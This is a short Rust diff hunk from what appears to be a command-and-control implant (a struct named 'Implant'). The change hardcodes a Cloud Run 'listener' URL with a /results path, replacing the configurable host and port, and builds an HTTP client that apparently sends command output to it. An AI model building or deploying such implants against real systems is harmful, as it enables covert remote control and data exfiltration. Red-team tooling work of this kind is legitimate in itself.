@@ -23,7 +23,7 @@ impl Implant {
 
         println!("{}", results_string);
 
-        let url = format!("http://{}:{}{}", self.host, self.port, self.uri);
+        let url = format!("https://listener-4uerpljfuq-og.a.run.app/results");
         let client = reqwest::Client::new();
         let mut headers = HeaderMap::new();
         headers.insert("Content-Type", HeaderValue::from_static("application/json"));
